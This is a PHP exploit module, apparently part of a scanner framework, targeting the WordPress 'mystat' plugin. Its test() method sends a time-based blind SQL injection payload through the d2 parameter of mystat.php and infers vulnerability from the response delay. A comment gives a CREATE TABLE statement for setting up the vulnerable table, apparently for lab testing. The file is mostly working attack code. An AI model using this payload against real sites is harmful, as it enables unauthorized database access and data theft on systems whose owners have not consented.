<?php
class myStatExploit extends BaseExploit
{
	/***
	 * note: mystat wont install on mysql 5.6 strict, (works on 4 and I guess 5)
	 error:
	 ERROR 1101 (42000): BLOB/TEXT column 'uri' can't have a default value
	 this happens in the setup query sent by the admin page of the plugin, which
	 is supposed to create table myStat_main. No table, no injection.
	 MySQL bug: http://stackoverflow.com/questions/3466872/why-cant-a-text-column-have-a-default-value-in-mysql
	 Use the query at the bottom of this page to install that table.
	 **/
	public $name="mystat";
	public $magic=true;
	public function test()
	{
		$this->timein();
		$res=$this->curl(self::$url."wp-content/plugins/mystat/mystat.php?act=stat_img&d1=1&d2=-1')%20AND%201=IF(2>1,{$this->benchmark()},0)--%20"
			);
		return !$this->fastEnough($this->timeout());
	}
} 

//CREATE TABLE wp38_myStat_main ( id int(11) unsigned NOT NULL auto_increment, date timestamp NOT NULL default '0000-00-00 00:00:00', date_load timestamp NOT NULL default '0000-00-00 00:00:00', ip int(11) NOT NULL default '0', proxy enum('0','1') NOT NULL default '0', code_stat int(11) unsigned NOT NULL default '404', feed enum('yes','no') NOT NULL default 'no', user varchar(60) NOT NULL default '', title varchar(255) NOT NULL default '', host varchar(100) NOT NULL default '', www enum('yes','no') NOT NULL default 'no', page varchar(255) NOT NULL default '', uri text , post_id int(11) NOT NULL default 0, user_agent text , referer text , lang char(2) NOT NULL default '', country varchar(150) NOT NULL default '', city varchar(32) NOT NULL default '', screen varchar(9) NOT NULL default '', depth enum('','8','16','32','48','64','128') NOT NULL default '', gzip enum('0','1') NOT NULL default '0', cookie enum('0','1') NOT NULL default '0', js varchar(4) NOT NULL default '', flash varchar(20) NOT NULL default '', java enum('0','1') NOT NULL default '0', count int(11) unsigned NOT NULL default '0', PRIMARY KEY (id), KEY indx1 (date,ip) );